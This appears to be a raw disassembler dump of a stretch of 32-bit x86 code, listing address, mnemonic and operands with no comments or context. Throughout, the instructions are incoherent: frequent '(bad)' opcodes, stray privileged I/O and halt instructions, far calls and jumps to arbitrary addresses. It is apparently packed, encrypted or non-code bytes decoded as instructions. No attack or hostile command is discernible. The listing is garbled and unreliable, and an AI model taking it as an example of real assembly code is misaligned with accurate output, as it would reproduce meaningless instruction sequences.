  4128cc:	mov    ecx,DWORD PTR [ecx+0x50]
  4128cf:	mov    DWORD PTR [eax],edi
  4128d1:	fs adc eax,0x35a16a52
  4128d7:	aaa    
  4128d8:	repnz sub eax,0xcbee08a0
  4128de:	sahf   
  4128df:	mov    ch,0xb3
  4128e1:	call   0xca37e228
  4128e6:	test   DWORD PTR [ebx+0x36],edi
  4128e9:	retf   
  4128ea:	test   eax,0xd0f84fc5
  4128ef:	mov    ebx,0x9cd4c88d
  4128f4:	sub    BYTE PTR [edi+0x1500a74d],ah
  4128fa:	fisttp WORD PTR [esi]
  4128fc:	push   esi
  4128fd:	stos   BYTE PTR es:[edi],al
  4128fe:	xchg   edi,eax
  4128ff:	loop   0x4128ff
  412901:	stos   DWORD PTR es:[edi],eax
  412902:	int    0x7d
  412904:	mov    esp,0x414cba43
  412909:	mov    ds:0xd73dddcd,al
  41290e:	repz inc esi
  412910:	add    al,0x91
  412912:	std    
  412913:	cwde   
  412914:	mov    eax,ds:0xb30cb664
  412919:	push   es
  41291a:	(bad)  
  41291b:	sub    BYTE PTR [edi+edi*4-0x5e],cl
  41291f:	cmp    edx,DWORD PTR [ebp-0x7a]
  412922:	xchg   ebx,eax
  412923:	adc    DWORD PTR ds:0xaeaf80ec,0x13
  41292a:	fs pusha 
  41292c:	les    edx,FWORD PTR ds:0x676a1564
  412932:	jecxz  0x4128c0
  412934:	mov    eax,0x73c32355
  412939:	and    DWORD PTR ds:[ebx-0x3e85b24],edx
  412940:	add    al,0xb3
  412942:	(bad)  
  412943:	jmp    0x7305f42e
  412948:	out    0xa5,al
  41294a:	in     al,dx
  41294b:	cmp    BYTE PTR [edx-0x5c],0x62
  41294f:	ror    BYTE PTR [edx+esi*2],0x2d
  412953:	outs   dx,DWORD PTR ds:[esi]
  412954:	dec    edx
  412955:	push   edx
  412956:	in     eax,0x15
  412958:	outs   dx,DWORD PTR ds:[esi]
  412959:	cmp    ecx,DWORD PTR ds:0xf363d501
  41295f:	mov    dl,0x51
  412961:	retf   0x8e9
  412964:	mov    bh,0x5e
  412966:	sbb    bl,al
  412968:	(bad)  
  412969:	pop    ebx
  41296a:	xchg   ebp,eax
  41296b:	in     al,dx
  41296c:	mov    ecx,DWORD PTR [ebx]
  41296e:	add    ebx,DWORD PTR [ecx+0x76]
  412971:	cmp    DWORD PTR [ebp+0x30],ecx
  412974:	aas    
  412975:	add    al,0x17
  412977:	add    ecx,DWORD PTR [esi]
  412979:	jecxz  0x41292e
  41297b:	inc    edi
  41297c:	pusha  
  41297d:	mov    esi,DWORD PTR [ebp-0x242eb737]
  412983:	dec    ecx
  412984:	jle    0x412966
  412986:	es jae 0x412991
  412989:	mov    eax,ds:0x9b727c21
  41298e:	call   0xff05:0xb8cb912f
  412995:	test   BYTE PTR [eax-0x4a],0xb2
  412999:	in     al,0x7f
  41299b:	xor    esi,DWORD PTR [edi+0x4e]
  41299e:	ja     0x41296d
  4129a0:	inc    esp
  4129a1:	mov    cl,0x16
  4129a3:	mov    edx,0x841e540e
  4129a8:	aad    0x66
  4129aa:	gs inc eax
  4129ac:	cli    
  4129ad:	out    dx,al
  4129ae:	xlat   BYTE PTR ds:[ebx]
  4129af:	jo     0x412a14
  4129b1:	dec    ebp
  4129b2:	inc    ebp
  4129b3:	add    ebx,0xd3bbfdc8
  4129b9:	lahf   
  4129ba:	scas   al,BYTE PTR es:[edi]
  4129bb:	xchg   ecx,eax
  4129bc:	push   cs
  4129bd:	or     BYTE PTR [edx+0x33e1bece],cl
  4129c3:	and    edi,DWORD PTR [edi+0x38b23e1d]
  4129c9:	mov    cl,0x93
  4129cb:	push   0xffffff8f
  4129cd:	es xchg esp,eax
  4129cf:	xchg   eax,ecx
  4129d1:	dec    eax
  4129d2:	(bad)  
  4129d3:	push   esp
  4129d4:	dec    ebp
  4129d5:	cmp    eax,0x4c200ada
  4129da:	test   eax,0xb9f4567f
  4129df:	in     eax,dx
  4129e0:	arpl   WORD PTR [esi-0x6f7ebb7e],bp
  4129e6:	stc    
  4129e7:	ss repnz mov ecx,0xe8b754e
  4129ee:	(bad)  
  4129ef:	push   esi
  4129f0:	push   edx
  4129f1:	shr    BYTE PTR [edx+0x7f],1
  4129f4:	fcomip st,st(3)
  4129f7:	mov    dh,0xe6
  4129f9:	pop    esp
  4129fa:	cmc    
  4129fb:	ja     0x4129a2
  4129fd:	inc    esp
  4129fe:	mov    al,0xca
  412a00:	data16 mov ah,0xa7
  412a03:	in     al,dx
  412a04:	cmp    BYTE PTR [eax],ch
  412a06:	cmp    edx,DWORD PTR [eax]
  412a08:	call   0x7167:0x5b1e31d5
  412a0f:	add    bl,BYTE PTR [esi-0x51d6cf4e]
  412a15:	dec    esi
  412a16:	mov    ?,WORD PTR [ebx+0x31]
  412a19:	mov    bh,0x68
  412a1b:	sbb    ebp,edi
  412a1d:	scas   al,BYTE PTR es:[edi]
  412a1e:	in     eax,0xd2
  412a20:	aad    0x91
  412a22:	data16 out dx,al
  412a24:	scas   eax,DWORD PTR es:[edi]
  412a25:	add    esi,esi
  412a27:	inc    ebx
  412a28:	addr16 gs out dx,al
  412a2b:	or     edx,DWORD PTR [edx+0x3f94af12]
  412a31:	rcl    edi,0xde
  412a34:	mov    ecx,0x13d9ed35
  412a39:	jl     0x4129d0
  412a3b:	inc    eax
  412a3c:	fist   DWORD PTR [edx]
  412a3e:	sbb    eax,0xcda8ad7b
  412a43:	(bad)  
  412a44:	into   
  412a45:	cld    
  412a46:	xchg   ebp,eax
  412a47:	js     0x412a49
  412a49:	adc    BYTE PTR [ebp-0x141dbce],ah
  412a4f:	jns    0x412abf
  412a51:	ret    
  412a52:	mov    cs,WORD PTR [edx]
  412a54:	in     eax,dx
  412a55:	add    eax,0x711d287e
  412a5a:	pop    ecx
  412a5b:	mov    esi,0x270853df
  412a60:	ret    0x6ee8
  412a63:	daa    
  412a64:	push   es
  412a65:	pop    ecx
  412a66:	lods   eax,DWORD PTR ds:[esi]
  412a67:	inc    eax
  412a68:	inc    esp
  412a69:	outs   dx,BYTE PTR ds:[esi]
  412a6a:	inc    ebp
  412a6b:	(bad)  
  412a6c:	es das 
  412a6e:	fwait
  412a6f:	aas    
  412a70:	jge    0x412ace
  412a72:	nop
  412a73:	and    DWORD PTR [ecx-0x4f],esi
  412a76:	jecxz  0x412a54
  412a78:	icebp  
  412a79:	xor    edx,0xdd81843e
  412a7f:	mov    DWORD PTR [esp+eiz*8-0x6e8d4c38],0x686633bb
  412a8a:	scas   eax,DWORD PTR es:[edi]
  412a8b:	inc    esi
  412a8c:	add    BYTE PTR [edi-0x44],bl
  412a8f:	xchg   BYTE PTR [esi-0xe],al
  412a92:	xchg   edi,eax
  412a93:	icebp  
  412a94:	fdivrp st(5),st
  412a96:	or     edi,ecx
  412a98:	arpl   WORD PTR [ecx-0x6c],bp
  412a9b:	jge    0x412a50
  412a9d:	jge    0x412a9d
  412a9f:	cld    
  412aa0:	sub    eax,DWORD PTR [edi-0x27745055]
  412aa6:	mov    ds:0x3f832c2f,al
  412aab:	popa   
  412aac:	cmp    al,0x35
  412aae:	sar    edx,1
  412ab0:	lahf   
  412ab1:	dec    edi
  412ab2:	mov    bl,al
  412ab4:	or     eax,0x77edaa91
  412ab9:	push   edx
  412aba:	loopne 0x412aea
  412abc:	js     0x412b27
  412abe:	scas   al,BYTE PTR es:[edi]
  412abf:	or     DWORD PTR [esi+esi*1-0x39e301a4],esp
  412ac6:	iret   
  412ac7:	out    0x80,al
  412ac9:	xchg   esi,eax
  412aca:	adc    BYTE PTR [esi+0x2],ah
  412acd:	lea    edi,[eax-0x1b]
  412ad0:	pusha  
  412ad1:	jbe    0x412a68
  412ad3:	pop    esp
  412ad4:	xchg   cl,cl
  412ad6:	fwait
  412ad7:	or     eax,0x3971e7de
  412adc:	aaa    
  412add:	mov    ebx,0x689862ac
  412ae2:	jnp    0x412b1a
  412ae4:	gs xchg edx,eax
  412ae6:	repz push esp
  412ae8:	sbb    ebp,ebx
  412aea:	mov    dl,0xe0
  412aec:	into   
  412aed:	mov    bl,0x43
  412aef:	xrelease mov BYTE PTR [ebx],ch
  412af2:	jp     0x412b5e
  412af4:	sbb    DWORD PTR [esi],ecx
  412af6:	fsub   st(0),st
  412af8:	and    DWORD PTR [ecx+0x63cd7ac5],esp
  412afe:	arpl   WORD PTR ds:0x86e6a35e,si
  412b04:	adc    cl,ch
  412b06:	leave  
  412b07:	add    edi,edi
  412b09:	and    esp,DWORD PTR [esi+0x5a]
  412b0c:	les    ebx,FWORD PTR [eax+0x203e1d9]
  412b12:	call   0x54773df6
  412b17:	push   ss
  412b18:	jmp    0x5cad:0x3be2f107
  412b1f:	xchg   edx,eax
  412b20:	dec    edi
  412b21:	mov    bl,0xa6
  412b23:	sbb    DWORD PTR [ebx+edi*1],ebx
  412b26:	adc    ebx,eax
  412b28:	sbb    ecx,DWORD PTR [ebp+0x66]
  412b2b:	sub    DWORD PTR [edi-0x1e],ebx
  412b2e:	push   esi
  412b2f:	push   edx
  412b30:	stc    
  412b31:	cmp    al,0xc3
  412b33:	xchg   ebx,eax
  412b34:	lea    ebx,[eax+eiz*8+0x46cd1499]
  412b3b:	add    eax,0x71c4eccc
  412b40:	jns    0x412b3c
  412b42:	div    DWORD PTR [esi]
  412b44:	mov    esp,0xb714375f
  412b49:	bound  esi,QWORD PTR ds:0xb344554d
  412b4f:	lods   eax,DWORD PTR ds:[esi]
  412b50:	mov    ecx,0x907db9a9
  412b55:	mov    edx,ecx
  412b57:	pop    eax
  412b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b59:	popf   
  412b5a:	jae    0x412b04
  412b5c:	mov    ebp,DWORD PTR [ebx]
  412b5e:	test   BYTE PTR ss:[edx],dl
  412b61:	and    eax,0xe7bc6349
  412b66:	aam    0x67
  412b68:	lock dec ecx
  412b6a:	cli    
  412b6b:	adc    ebx,esi
  412b6d:	aaa    
  412b6e:	and    esi,DWORD PTR [eax]
  412b70:	fcomp  QWORD PTR [ebx-0x6]
  412b73:	xchg   edx,eax
  412b75:	lahf   
  412b76:	pop    ds
  412b77:	push   edi
  412b78:	sqrtps xmm0,XMMWORD PTR ds:0x1c25bc31
  412b7f:	xor    esp,ebx
  412b81:	push   ss
  412b82:	or     ebp,DWORD PTR [eax]
  412b84:	pop    es
  412b85:	jbe    0x412c00
  412b87:	std    
  412b88:	nop
  412b89:	test   dl,0x6c
  412b8c:	jmp    0xa2c2:0xadac0689
  412b93:	push   0x5d
  412b95:	lods   al,BYTE PTR ds:[esi]
  412b96:	push   es
  412b97:	or     ah,al
  412b99:	aas    
  412b9a:	repnz neg eax
  412b9d:	jnp    0x412b93
  412b9f:	bound  edi,QWORD PTR [ebx-0x3d033706]
  412ba5:	push   ebx
  412ba6:	iret   
  412ba7:	sbb    al,0x57
  412ba9:	dec    ecx
  412baa:	add    edx,esp
  412bac:	or     eax,0x5e09a982
  412bb1:	sub    DWORD PTR [edx-0x46],esp
  412bb4:	lock push ss
  412bb6:	mov    eax,ds:0xe953ae27
  412bbb:	call   DWORD PTR [ecx-0x53]
  412bbe:	das    
  412bbf:	pop    es
  412bc0:	or     ch,BYTE PTR [ebx]
  412bc2:	aam    0xa5
  412bc4:	mov    ebp,0xaca14692
  412bc9:	inc    esp
  412bca:	jle    0x412b91
  412bcc:	or     al,0xcc
  412bce:	in     al,dx
  412bcf:	out    dx,eax
  412bd0:	cmp    DWORD PTR [edx],0xffffffba
  412bd3:	mov    esp,0x9ed49469
  412bd8:	rcl    DWORD PTR [edx+eiz*2-0x3e],cl
  412bdc:	mov    ebx,0x873f732a
  412be1:	inc    edx
  412be2:	push   0xffffffac
  412be4:	jmp    0x1b1d5833
  412be9:	mov    ch,0x97
  412beb:	stc    
  412bec:	sub    esi,esi
  412bee:	shr    DWORD PTR [ecx+0x1],cl
  412bf1:	jns    0x412bb3
  412bf3:	dec    edx
  412bf4:	mov    ah,0x56
  412bf6:	mov    dl,0xb1
  412bf8:	cmp    al,0x76
  412bfa:	cmc    
  412bfb:	mov    ds:0xe4267393,al
  412c00:	sub    DWORD PTR [ebx],eax
  412c02:	cmp    al,0xf4
  412c04:	mov    esp,0x37addf2b
  412c09:	call   0x27d97d7d
  412c0e:	rol    DWORD PTR [ebp-0x3fbf4a75],cl
  412c14:	sub    BYTE PTR [esi-0x26],al
  412c17:	(bad)  
  412c18:	cmp    eax,0x7aa111b2
  412c1d:	dec    ecx
  412c1e:	and    BYTE PTR [ebx+ebp*8+0x4660d570],dl
  412c25:	out    0xd8,eax
  412c27:	or     ch,ch
  412c29:	retf   
  412c2a:	jno    0x412cab
  412c2c:	inc    ebx
  412c2d:	lods   al,BYTE PTR ds:[esi]
  412c2e:	popf   
  412c2f:	inc    edx
  412c30:	popa   
  412c31:	inc    eax
  412c32:	ss into 
  412c34:	in     al,0x93
  412c36:	je     0x412c2c
  412c38:	xor    al,0x7a
  412c3a:	mov    dh,0xbf
  412c3c:	push   esi
  412c3d:	pop    eax
  412c3e:	enter  0xd4f5,0x5d
  412c42:	mov    ecx,0x5e5f831c
  412c47:	and    BYTE PTR [esi-0x3],dl
  412c4a:	add    DWORD PTR [edx+eiz*2-0x27],0xa602b33c
  412c52:	inc    edx
  412c53:	out    dx,al
  412c54:	mov    eax,0xe548be4a
  412c59:	imul   ebx,esi,0x33a6982b
  412c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c60:	rol    dh,0x23
  412c63:	sbb    BYTE PTR [ebx-0x75a4bcfe],al
  412c69:	and    bl,BYTE PTR [esi+0x70023df6]
  412c6f:	hlt    
  412c70:	mov    ds:0xfb9d16b6,eax
  412c75:	mov    edi,0x4bbd7956
  412c7a:	push   edx
  412c7b:	mov    al,0xb2
  412c7d:	sub    al,0xc9
  412c7f:	inc    ebp
  412c80:	mov    ebx,0xb2affa0b
  412c85:	mov    eax,ds:0xd67c0709
  412c8a:	dec    BYTE PTR [ecx+0x1d]
  412c8d:	out    dx,al
  412c8e:	rcr    BYTE PTR [ebx-0x387fe0cf],1
  412c94:	in     eax,0xd0
  412c96:	xchg   ebp,eax
  412c97:	pop    esp
  412c98:	retf   0xbf4d
  412c9b:	push   ebx
  412c9c:	ins    DWORD PTR es:[edi],dx
  412c9d:	xchg   BYTE PTR [edx+ebp*2-0x733b4290],ch
  412ca4:	cmp    ecx,DWORD PTR [esi]
  412ca6:	xor    al,0xd7
  412ca8:	inc    eax
  412ca9:	aam    0xe7
  412cab:	push   edx
  412cac:	dec    edx
  412cad:	stc    
  412cae:	dec    edx
  412caf:	out    dx,al
  412cb0:	std    
  412cb1:	ins    BYTE PTR es:[edi],dx
  412cb2:	and    eax,0x18e44e3
  412cb7:	mov    dl,0xee
  412cb9:	push   eax
  412cba:	and    BYTE PTR [ebx],dl
  412cbc:	pop    ebx
  412cbd:	pop    esi
  412cbe:	pop    es
  412cbf:	retf   
  412cc0:	mov    ebx,0xaa90ed9d
  412cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cc6:	mov    dl,BYTE PTR [edx+0x54]
  412cc9:	test   al,0xe
  412ccb:	mov    esp,ebx
  412ccd:	fsubr  DWORD PTR [ebx]
  412ccf:	adc    edx,DWORD PTR [eax+ebx*2+0x3866f1cf]
  412cd6:	aas    
  412cd7:	sub    eax,0xa765d2da
  412cdc:	sbb    al,0xe3
  412cde:	inc    eax
  412cdf:	div    DWORD PTR [ebp+0xc]
  412ce2:	mov    WORD PTR [eax],es
  412ce4:	dec    edx
  412ce5:	pushf  
  412ce6:	lods   eax,DWORD PTR ds:[esi]
  412ce7:	shr    DWORD PTR [edx-0x48c8db5c],1
  412ced:	mov    esi,0x5053b2c3
  412cf2:	adc    BYTE PTR [edx+ebx*2],0xab
  412cf6:	hlt    
  412cf7:	scas   al,BYTE PTR es:[edi]
  412cf8:	test   eax,0x13ee5864
  412cfd:	mov    al,0x8
  412cff:	adc    BYTE PTR [eax+0x2acab062],al
  412d05:	shl    ebp,0x1e
  412d08:	(bad)  
  412d09:	repz call 0xf792b065
  412d0f:	inc    eax
  412d10:	cld    
  412d11:	sub    cl,cl
  412d13:	jo     0x412cc7
  412d15:	adc    BYTE PTR [ebp+0x28],dh
  412d18:	bsf    ebp,DWORD PTR [eax-0x5f]
  412d1c:	and    ebx,ebx
  412d1e:	and    DWORD PTR [esi+0x65c3d702],ebp
  412d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d25:	and    BYTE PTR [esi-0x40f85923],al
  412d2b:	repnz mov al,ds:0x153aba1a
  412d31:	inc    ebp
  412d32:	pop    edi
  412d33:	jge    0x412cd2
  412d35:	fbld   TBYTE PTR [esi+0x7ad6cb9b]
  412d3b:	nop
  412d3c:	scas   al,BYTE PTR es:[edi]
  412d3d:	push   edx
  412d3e:	mov    eax,0xd37deb06
  412d43:	into   
  412d44:	dec    ecx
  412d45:	or     al,0xce
  412d47:	outs   dx,BYTE PTR ds:[esi]
  412d48:	sub    BYTE PTR [edi],dl
  412d4a:	into   
  412d4b:	psrld  mm4,QWORD PTR [esi]
  412d4e:	out    dx,eax
  412d4f:	lahf   
  412d50:	fs pop edx
  412d52:	aaa    
  412d53:	and    ah,0x25
  412d56:	push   ebp
  412d57:	add    DWORD PTR [esi],esi
  412d59:	mov    di,0x18ef
  412d5d:	pop    edx
  412d5e:	dec    ebx
  412d5f:	mov    eax,ds:0x3424b631
  412d64:	dec    esi
  412d65:	enter  0x7be1,0x9e
  412d69:	gs inc ebx
  412d6b:	adc    DWORD PTR [ecx+0x692b3700],0x6794ed71
  412d75:	xor    DWORD PTR [esi-0x18404d63],edx
  412d7b:	stc    
  412d7c:	scas   eax,DWORD PTR es:[edi]
  412d7d:	cdq    
  412d7e:	inc    ebx
  412d7f:	(bad)  [ebp-0x106bd704]
  412d85:	cmp    cl,cl
  412d87:	icebp  
  412d88:	gs xchg esi,eax
  412d8a:	hlt    
  412d8b:	scas   eax,DWORD PTR es:[edi]
  412d8c:	ja     0x412dfd
  412d8e:	cmp    al,0x6f
  412d90:	lds    ebx,FWORD PTR [esi+0x77f0ad4d]
  412d96:	dec    ebx
  412d97:	sub    eax,0xd4309e5
  412d9c:	push   ecx
  412d9d:	cli    
  412d9e:	aaa    
  412d9f:	addr16 cmp ah,bl
  412da2:	cmp    DWORD PTR [edx-0x3e],ebp
  412da5:	inc    ecx
  412da6:	pop    ds
  412da7:	imul   edx,eax,0xefecb417
  412dad:	ins    BYTE PTR es:[edi],dx
  412dae:	cmp    BYTE PTR [edx-0x723fbab8],bh
  412db4:	test   BYTE PTR [ebp-0x162ad298],dh
  412dba:	frstor [ebp-0x2e]
  412dbd:	pop    ds
  412dbe:	call   0x8fe0:0x5d8cf34a
  412dc5:	cmc    
  412dc6:	aaa    
  412dc7:	cmp    BYTE PTR [ebx+0x75b884ec],ch
  412dcd:	adc    DWORD PTR [ecx-0x16743581],0xc6eb1230
  412dd7:	call   0x855579fb
  412ddc:	adc    DWORD PTR [edx-0x29318455],eax
  412de2:	bound  esp,QWORD PTR [esi]
  412de4:	test   BYTE PTR [edi-0x4a2bf306],dh
  412dea:	aas    
  412deb:	sub    BYTE PTR [eax-0x36],0x15
  412def:	lea    eax,[eax+0x2a]
  412df2:	pop    esp
  412df3:	addr16 jno 0x412db8
  412df6:	loopne 0x412da9
  412df8:	sbb    al,0x55
  412dfa:	into   
  412dfb:	in     eax,dx
  412dfc:	imul   eax,DWORD PTR [edx+0x0],0xffffff8c
  412e00:	mov    al,0xa9
  412e02:	ja     0x412e5c
  412e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e05:	mov    cl,0xf0
  412e07:	mov    WORD PTR [edx+0x7e],ss
  412e0a:	call   0xea58787a
  412e0f:	mov    dl,dl
  412e11:	mov    ebp,0x56b1e341
  412e16:	adc    esi,DWORD PTR [ebp-0x2a60c225]
  412e1c:	test   al,0x5e
  412e1e:	jge    0x412e8d
  412e20:	hlt    
  412e21:	out    0x67,eax
  412e23:	nop
  412e24:	adc    al,0x69
  412e26:	and    eax,0xfa719052
  412e2b:	jge    0x412e0d
  412e2d:	and    edx,edx
  412e2f:	ins    DWORD PTR es:[edi],dx
  412e30:	loop   0x412e7b
  412e32:	sub    ebp,esi
  412e34:	aaa    
  412e35:	sub    al,0xac
  412e37:	or     ch,BYTE PTR [ecx]
  412e39:	test   BYTE PTR [ebx],bl
  412e3b:	mov    al,0xc0
  412e3d:	hlt    
  412e3e:	loope  0x412e59
  412e40:	gs cmc 
  412e42:	push   0x3
  412e44:	sub    ebp,DWORD PTR [edx]
  412e46:	inc    ecx
  412e47:	mov    eax,0xb3fd2ea6
  412e4c:	xlat   BYTE PTR ds:[ebx]
  412e4d:	jmp    0x412e53
  412e4f:	xor    al,0xef
  412e51:	sub    edi,DWORD PTR [edx]
  412e53:	enter  0x6a15,0x1b
  412e57:	fsubr  st,st(3)
  412e59:	rcr    BYTE PTR [eax],1
  412e5b:	adc    ch,BYTE PTR [bp+di+0x5e18]
  412e60:	test   al,0x41
  412e62:	ret    
  412e63:	adc    al,0x99
  412e65:	jne    0x412e8b
  412e67:	mov    ch,0xa0
  412e69:	jae    0x412e2b
  412e6b:	test   al,dh
  412e6d:	mov    eax,0x1b11c6db
  412e72:	lds    edi,FWORD PTR [esi-0x6f]
  412e75:	enter  0x760d,0xf8
  412e79:	int    0xd7
  412e7b:	je     0x412e8a
  412e7d:	test   DWORD PTR [edx+eax*1-0x38dd2a5c],edi
  412e84:	aam    0x62
  412e86:	pushf  
  412e87:	lock add DWORD PTR [edx+eiz*1+0x3a],ebp
  412e8c:	xchg   ebx,eax
  412e8d:	xor    DWORD PTR ds:0x7a4ac1d9,0xd2b94cd
  412e97:	push   edx
  412e98:	jae    0x412f03
  412e9a:	out    0xbc,eax
  412e9c:	jnp    0x412ee4
  412e9e:	in     eax,0x59
  412ea0:	enter  0xb29f,0x70
  412ea4:	xchg   DWORD PTR [esi+ebp*8],ecx
  412ea7:	sar    DWORD PTR [edi],1
  412ea9:	retf   
  412eaa:	dec    ebx
  412eab:	lods   al,BYTE PTR ds:[esi]
  412eac:	ins    DWORD PTR es:[edi],dx
  412ead:	lahf   
  412eae:	fs xchg ebx,eax
  412eb0:	out    dx,al
  412eb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb2:	jno    0x412e3d
  412eb4:	and    al,ah
  412eb6:	push   esp
  412eb7:	nop
  412eb8:	pop    es
  412eb9:	sub    al,BYTE PTR [ebx+eiz*2-0x50e34b94]
  412ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec1:	mov    ah,0xbb
  412ec3:	ins    DWORD PTR es:[edi],dx
  412ec4:	sbb    eax,0x3e14fcfe
  412ec9:	cmp    BYTE PTR [edx],0x3e
  412ecc:	add    al,0xbb
  412ece:	add    cl,bh
  412ed0:	shl    DWORD PTR ds:0xc9cf6451,1
  412ed6:	es je  0x412f4b
  412ed9:	std    
  412eda:	pop    edx
  412edb:	xor    cl,cl
  412edd:	adc    eax,ebx
  412edf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ee0:	out    dx,eax
  412ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ee2:	or     DWORD PTR [edi+0x9229f78],eax
  412ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ee9:	fisttp DWORD PTR gs:[esi]
  412eec:	lods   eax,DWORD PTR ds:[esi]
  412eed:	pop    esi
  412eee:	pop    edx
  412eef:	les    eax,FWORD PTR [esi]
  412ef1:	out    0x65,al
  412ef3:	out    0xb,al
  412ef5:	hlt    
  412ef6:	push   esp
  412ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef8:	call   0xe2df9150
  412efd:	nop
  412efe:	jno    0x412edf
  412f00:	aad    0x3b
  412f02:	fisubr DWORD PTR [esp+eiz*4-0x3718d0e5]
  412f09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f0a:	ds xchg ebx,eax
  412f0c:	xor    bh,BYTE PTR [ebx+edx*1-0x781fb46f]
  412f13:	(bad)  
  412f16:	cmc    
  412f17:	adc    eax,0xfc821b6a
  412f1c:	cli    
  412f1d:	cmp    eax,0x46c136bb
  412f22:	dec    ebp
  412f23:	or     BYTE PTR [edi],dl
  412f25:	jns    0x412f13
  412f27:	mov    dl,0x6f
  412f29:	and    eax,0x9116334d
  412f2e:	test   eax,0x308282
  412f33:	sbb    BYTE PTR [eax+0x37],ah
  412f36:	cld    
  412f37:	in     al,dx
  412f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f39:	pusha  
  412f3a:	push   cs
  412f3b:	jmp    0xde88ba79
  412f40:	push   0xcf5d8df
  412f45:	lods   al,BYTE PTR ds:[esi]
  412f46:	xor    BYTE PTR [ecx+edx*1],0xea
  412f4a:	std    
  412f4b:	imul   eax,edi,0x731c51d2
  412f51:	aad    0x18
  412f53:	add    ah,dl
  412f55:	push   edi
  412f56:	lods   eax,DWORD PTR ds:[esi]
  412f57:	cld    
  412f58:	ins    DWORD PTR es:[edi],dx
  412f59:	xchg   esp,eax
  412f5a:	hlt    
  412f5b:	cmp    DWORD PTR [esi-0x67],ecx
  412f5e:	popa   
  412f5f:	sub    eax,0xfe8f66f8
  412f64:	mov    ebx,0xb4b3ff5d
  412f69:	enter  0xf40,0xb7
  412f6d:	(bad)  
  412f6f:	mov    bh,BYTE PTR [ebx+0x3f]
  412f72:	sub    DWORD PTR [edi],edi
  412f74:	icebp  
  412f75:	aaa    
  412f76:	into   
  412f77:	pushf  
  412f78:	mov    ebx,0x4e811fcb
  412f7d:	and    al,BYTE PTR [edi+0x59]
  412f80:	mov    bl,0x1e
  412f82:	mov    bh,0x5e
  412f84:	sti    
  412f85:	push   0x78bbde1c
  412f8a:	(bad)  
  412f8b:	retf   0x74c2
  412f8e:	ja     0x412fac
  412f90:	sar    DWORD PTR [ebp-0x59beacb2],1
  412f96:	add    al,0x29
  412f98:	cmp    edx,DWORD PTR [ebp+0x56806980]
  412f9e:	stos   DWORD PTR es:[edi],eax
  412f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fa0:	and    ah,BYTE PTR [ebx+0x1d]
  412fa3:	sub    DWORD PTR [eax-0x21b75c0a],0xaa3fa5d7
  412fad:	mov    ch,0x26
  412faf:	lods   eax,DWORD PTR ds:[esi]
  412fb0:	sub    al,0x52
  412fb2:	pop    ss
  412fb3:	mov    ch,0x44
  412fb5:	test   eax,0x6f7869c4
  412fba:	push   ss
  412fbb:	adc    esi,esi
  412fbd:	xor    eax,0x2a3fca3e
  412fc2:	pop    ds
  412fc3:	lock sub eax,0x8cace11
  412fc9:	push   edi
  412fca:	sub    dl,BYTE PTR [ebx+eax*2-0x646093c5]
  412fd1:	pop    ecx
  412fd2:	popf   
  412fd3:	in     eax,0x53
  412fd5:	imul   esp,DWORD PTR [esi],0xffffffaa
  412fd8:	pusha  
  412fd9:	mov    eax,ds:0x44beb99b
  412fde:	ins    DWORD PTR es:[edi],dx
  412fdf:	ret    0xbf0b
  412fe2:	add    BYTE PTR [edi+ebp*8+0x5d835e69],ch
  412fe9:	cmp    dh,BYTE PTR [edx+0x6e]
  412fec:	test   DWORD PTR [eax+0x20],edx
  412fef:	or     esp,DWORD PTR [eax-0xc9c8fec]
  412ff5:	xchg   ebx,eax
  412ff6:	cli    
  412ff7:	pop    edx
  412ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff9:	mov    ebp,0x62296c66
  412ffe:	mov    bh,0x9d
  413000:	add    DWORD PTR [edx+0x54c7c9a6],0x41
  413007:	inc    esp
  413008:	push   edx
  413009:	test   BYTE PTR [edx],ch
  41300b:	loop   0x41304b
  41300d:	mov    bl,0x36
  41300f:	or     bl,BYTE PTR [eax-0x7320aa60]
  413015:	and    eax,0x38d36650
  41301a:	fcmove st,st(4)
  41301c:	inc    DWORD PTR [eax+esi*4]
  41301f:	lods   al,BYTE PTR ds:[esi]
  413020:	aam    0xf7
  413022:	je     0x413087
  413024:	and    ch,BYTE PTR [edx+0x4f6045ce]
  41302a:	lea    ecx,[esi]
  41302c:	std    
  41302d:	ror    ebp,cl
  41302f:	(bad)  [eax+0x10a34a0f]
  413035:	inc    esi
  413036:	sbb    al,0x88
  413038:	xor    al,0xa1
  41303a:	xor    ecx,DWORD PTR [ecx]
  41303c:	add    BYTE PTR [ecx-0x708844],al
  413042:	sbb    bl,ah
  413044:	pushf  
  413045:	or     eax,0x77ff390f
  41304a:	mov    esi,0x2041520a
  41304f:	hlt    
  413050:	pop    ss
  413051:	outs   dx,BYTE PTR ds:[esi]
  413052:	adc    BYTE PTR [edi],al
  413054:	push   es
  413055:	mov    dl,0x3a
  413057:	dec    esp
  413058:	out    0xf8,al
  41305a:	and    eax,0xf7b5e6dd
  41305f:	jae    0x413015
  413061:	(bad)  
  413062:	hlt    
  413063:	or     esp,DWORD PTR [esi-0x29]
  413066:	in     eax,0xab
  413068:	mov    bh,0x57
  41306a:	sub    DWORD PTR [edx+0x178a3f57],eax
  413070:	mov    dh,0xb9
  413072:	hlt    
  413073:	push   esi
  413074:	xchg   ebp,eax
  413075:	or     DWORD PTR [edx+0x4e9473b],eax
  41307b:	adc    al,0x7e
  41307d:	cmovnp ecx,DWORD PTR [esi-0x3b]
  413081:	jae    0x4130d5
  413083:	(bad)  
  413084:	outs   dx,DWORD PTR ds:[esi]
  413085:	ds jmp 0x5155c6bd
  41308b:	or     BYTE PTR ds:0xfe9d06a9,0xe
  413092:	js     0x413025
  413094:	mov    DWORD PTR ds:0x5a4a9cb2,esi
